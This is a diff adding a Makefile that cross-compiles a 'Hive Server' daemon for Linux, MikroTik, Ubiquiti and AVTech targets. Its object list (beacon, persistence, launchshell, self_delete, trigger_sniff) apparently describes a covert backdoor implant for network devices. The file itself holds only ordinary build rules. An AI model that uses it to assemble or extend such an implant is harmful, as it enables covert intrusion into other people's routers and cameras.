@@ -1,0 +1,263 @@
+####################################################
+# Architecture-agnostic Makefile for Hive Server
+####################################################
+
+SERVER_BASENAME = hived
+SERVER := $(SERVER_BASENAME)-$(TARGET)
+
+SHELL := $(shell which bash)
+CC := $(shell which gcc)
+MD5SUM := $(shell which md5sum)
+STRIP := $(shell which strip)
+
+COMMON = ../common
+CRYPTO = $(COMMON)/crypto
+SSL = $(COMMON)/ssl/library
+BZIP2 = $(COMMON)/bzip2
+STRINGS = $(COMMON)/strings
+LIBSSL = $(SSL)/libpolarssl.a
+LIBBZIP2 = $(BZIP2)/libbz2.a
+LIBCRYPTO = $(CRYPTO)/libcrypto.a
+LIBDEBUG = $(COMMON)/debug/libdebug.a
+
+INCLUDES = -I. -I$(BZIP2) -I$(CRYPTO) -I$(BZIP2) -I$(COMMON)/ssl/include -I$(COMMON)/debug
+
+#Default FLAGS
+CFLAGS := -Wall -Wextra -ansi -std=gnu99
+CFLAGS += $(INCLUDES)
+
+LDFLAGS = -lpthread
+
+# TARGET Configuration
+ifeq ("$(TARGET)", "linux-x86")
+  include $(COMMON)/Makefile-include.linux-x86
+else ifeq ("$(TARGET)", "linux-x86_64")
+  include $(COMMON)/Makefile-include.linux-x86_64
+else ifeq ("$(TARGET)", "mikrotik-mips")
+  include $(COMMON)/Makefile-include.mikrotik-mips
+#else ifeq ("$(TARGET)", "mikrotik-mipsel")
+#  include $(COMMON)/Makefile-include.mikrotik-mipsel
+else ifeq ("$(TARGET)", "mikrotik-x86")
+  include $(COMMON)/Makefile-include.mikrotik-x86
+else ifeq ("$(TARGET)", "mikrotik-ppc")
+  include $(COMMON)/Makefile-include.mikrotik-ppc
+else ifeq ("$(TARGET)", "ubiquiti-mips")
+  include $(COMMON)/Makefile-include.ubiquiti-mips
+else ifeq ("$(TARGET)", "avtech-arm")
+  include $(COMMON)/Makefile-include.avtech-arm
+#else ifeq ("$(TARGET)", "solaris-x86")
+#  include $(COMMON)/Makefile-include.solaris-x86
+endif
+
+BINARY = .
+LIB = .
+
+.PHONY: ARCH_BUILD $(BZIP2)/ARCH_BUILD $(CRYPTO)/ARCH_BUILD $(SSL)/ARCH_BUILD $(STRINGS)/ARCH_BUILD
+include ARCH_BUILD
+include $(BZIP2)/ARCH_BUILD
+include $(CRYPTO)/ARCH_BUILD
+include $(SSL)/ARCH_BUILD
+include $(STRINGS)/ARCH_BUILD
+
+OBJS =	beacon.o client_session.o compression.o daemonize.o dns_client.o decode_dns.o farm9crypt.o get_data.o \
+	ifconfig.o init_strings.o jshell.o launchshell.o main.o netstat_an.o netstat_rn.o \
+	persistence.o process_list.o run_command.o self_delete.o shuffle.o survey_mac.o survey_uptime.o \
+	threads.o tiny_crc16.o trigger_b64.o trigger_callback_session.o trigger_listen.o trigger_payload.o trigger_sniff.o twofish.o
+
+#OBJS =	beacon.o persistence.o launchshell.o \
+#	shuffle.o twofish.o farm9crypt.o jshell.o \
+#	survey_mac.o survey_uptime.o trigger_listen.o daemonize.o \
+#	main.o tiny_crc16.o \
+#	self_delete.o trigger_b64.o trigger_payload.o trigger_sniff.o \
+#	threads.o trigger_callback_session.o client_session.o run_command.o \
+#	get_data.o process_list.o netstat_an.o netstat_rn.o ifconfig.o compression.o \
+#	init_strings.o
+
+LIBS = $(LIBBZIP2) $(LIBCRYPTO) $(LIBSSL) $(LIBCRYPTO) $(LIBDEBUG)
+
+# Debug Configuration
+# 	LEVEL 1 -- optimization disabled, symbols only
+# 	LEVEL 2 -- debugging code for all but PolarSSL
+# 	LEVEL 3 -- all debugging code including PolarSSL
+ifdef DEBUG
+  ifeq ("$(DEBUG)", "1")	
+    CFLAGS += -g -O0
+    LIBDEBUG :=
+  endif
+  ifeq ("$(DEBUG)", "2")	
+    CFLAGS += -DDEBUG -D_DEBUG -g -O0
+    LIBS += $(LIBDEBUG)
+  endif
+  ifeq ("$(DEBUG)", "3")	
+    CFLAGS += -DDEBUG -D_DEBUG -g -O0
+    LIBS += $(LIBDEBUG)
+    CFLAGS += -DPOLARSSL_DEBUG_C -DPOLARSSL_DEBUG_MSG
+  endif
+else
+  CFLAGS += -Os
+  LIBDEBUG :=
+endif
+
+PS = process_list.c
+NETSTAT = netstat_an.c netstat_rn.c
+IFC = ifconfig.c
+
+#STRIPFLAGS += --strip-all --remove-section=.comment --remove-section=.note
+
+OS = $(shell uname)
+
+$(info )
+$(info )
+$(info =========================================================================)
+ifdef ARCH_BUILD_SERVER
+  ifneq ("$(ARCH_BUILD_SERVER)", "$(TARGET)")
+    SERVER_REBUILD:=clean
+    $(info .       Rebuilding $(SERVER))
+  else
+    SERVER_REBUILD:=
+    $(info .       $(SERVER) for $(TARGET) previously built.)
+  endif
+else
+  SERVER_REBUILD:=clean
+    $(info .       Building $(SERVER))
+endif
+
+ifdef ARCH_BUILD_BZIP2
+  ifneq ("$(ARCH_BUILD_BZIP2)", "$(TARGET)")
+    BZIP2_REBUILD:=force-rebuild
+  else
+    BZIP2_REBUILD:=
+  endif
+else
+  BZIP2_REBUILD:=force-rebuild
+endif
+
+ifdef ARCH_BUILD_CRYPTO
+  ifneq ("$(ARCH_BUILD_CRYPTO)", "$(TARGET)")
+    CRYPTO_REBUILD:=force-rebuild
+  else
+    CRYPTO_REBUILD:=
+  endif
+else
+  CRYPTO_REBUILD:=force-rebuild
+endif
+
+ifdef ARCH_BUILD_SSL
+  ifneq ("$(ARCH_BUILD_SSL)", "$(TARGET)")
+    SSL_REBUILD:=force-rebuild
+  else
+    SSL_REBUILD:=
+  endif
+else
+  SSL_REBUILD:=force-rebuild
+endif
+
+ifdef ARCH_BUILD_STRINGS
+  ifneq ("$(ARCH_BUILD_STRINGS)", "$(TARGET)")
+    STRINGS_REBUILD:=force-rebuild
+  else
+    STRINGS_REBUILD:=
+  endif
+else
+  STRINGS_REBUILD:=force-rebuild
+endif
+
+ifdef ARCH_BUILD_DEBUG
+  ifneq ("$(ARCH_BUILD_DEBUG)", "$(TARGET)")
+    DEBUG_REBUILD:=force-rebuild
+  else
+    DEBUG_REBUILD:=
+  endif
+else
+  DEBUG_REBUILD:=force-rebuild
+endif
+
+$(info =========================================================================)
+$(info .  TARGET: $(TARGET))
+$(info .  SRCDIR: $(PWD))
+$(info .      CC: $(CC))
+$(info .  CFLAGS: $(CFLAGS))
+$(info . LDFLAGS: $(LDFLAGS))
+$(info =========================================================================)
+$(info )
+
+.PHONY: all
+all: $(SERVER)
+
+$(LIBSSL): $(SSL_REBUILD)
+	cd $(SSL) && $(MAKE) DEBUG=$(DEBUG) TARGET=$(TARGET)
+
+$(LIBBZIP2): $(BZIP2_REBUILD)
+	cd $(BZIP2) && $(MAKE) TARGET=$(TARGET)
+
+$(LIBCRYPTO): $(CRYPTO_REBUILD)
+	cd $(CRYPTO) && $(MAKE) TARGET=$(TARGET)
+
+$(LIBDEBUG): $(DEBUG_REBUILD)
+	cd $(COMMON)/debug && $(MAKE) TARGET=$(TARGET)
+
+.PHONY: debug
+debug: $(SERVER)-dbg
+
+.PHONY: release
+release: $(SERVER)
+
+$(SERVER): $(SERVER_REBUILD) $(LIBCRYPTO) proj_strings.h $(OBJS) $(LIBSSL) $(LIBBZIP2) $(STRINGS)/string_utils.o $(LIBDEBUG)
+	if ! test $(DEBUG); then \
+		printf "\tLD\t\t$@\n"; \
+		$(CC) $(CFLAGS) $(OBJS) $(LDFLAGS) $(STRINGS)/string_utils.o $(LIBS) -o $@; \
+		printf "\tStripping\t$@\n"; \
+		$(STRIP) $(BINARY)/$(SERVER); \
+		$(MD5SUM) $(BINARY)/$(SERVER) > $(BINARY)/$(SERVER).md5; \
+	else \
+		printf "\n\tCREATING DEBUG LEVEL $(DEBUG) VERSION OF $@\n\n"; \
+		printf "\tLD\t\t$@-dbg\n"; \
+		$(CC) $(CFLAGS) $(OBJS) $(LDFLAGS) $(STRINGS)/string_utils.o $(LIBS) -o $@-dbg; \
+		$(MD5SUM) $(BINARY)/$(SERVER)-dbg > $(BINARY)/$(SERVER)-dbg.md5; \
+	fi
+	echo "ARCH_BUILD_SERVER=$(TARGET)" > ARCH_BUILD
+
+valgrind: $(LIBSSL) $(LIBBZIP2) $(LIBCRYPTO)
+	$(CC) -D__VALGRIND__ -D_IFCONFIG -D_NETSTAT_AN -D_NETSTAT_RN -D_PS_EF $(CFLAGS) $(DBGFLAGS) $(OBJS) $(PS) $(IFC) $(NETSTAT) -L$(LIB) -o $(BINARY)/$(SERVER)-$@
+
+.PHONY: efence
+efence: $(LIBSSL) $(LIBBZIP2) $(LIBCRYPTO)
+	$(CC) -lefence -D__EFENCE__ -D_IFCONFIG -D_NETSTAT_AN -D_NETSTAT_RN -D_PS_EF $(CFLAGS) $(DBGFLAGS) $(OBJS) $(PS) $(IFC) $(NETSTAT) -L$(LIB) -o $(BINARY)/$(SERVER)-$@
+
+
+proj_strings.h:
+	printf "\tGenerating\t$@\n"
+	python mod_gen_string_header.py server_strings.txt SERVER_STRINGS
+
+init_strings.o: init_strings.c $(STRINGS)/string_utils.o
+	printf "\tCC\t\t$<\n"
+	$(CC) -c $(CFLAGS) init_strings.c
+
+init_strings.c: proj_strings.h server_strings.txt
+	printf "\tGenerating\t$@\n"
+	python mod_gen_string_header.py server_strings.txt SERVER_STRINGS
+
+$(STRINGS)/string_utils.o:  $(STRINGS_REBUILD) $(STRINGS)/string_utils.h
+	printf "\tCC\t\t$<\n"
+	cd $(STRINGS) && $(MAKE) TARGET=$(TARGET)
+
+.PHONY: clean
+clean:
+	rm -f $(OBJS)
+	>ARCH_BUILD
+
+.PHONY: md5
+md5: all
+	$(MD5SUM) $(BINARY)/$(SERVER)-dbg > $(BINARY)/$(SERVER)-dbg.md5
+	$(MD5SUM) $(BINARY)/$(SERVER) > $(BINARY)/$(SERVER).md5
+
+.PHONY: tarball	
+tarball:
+	$(MAKE) -f ./Makefile tarball
+
+.c.o:
+	printf "\tCC\t\t$<\n"
+	$(CC) $(CFLAGS) -c $<
+
+.PHONY: force-rebuild
+force-rebuild: ;
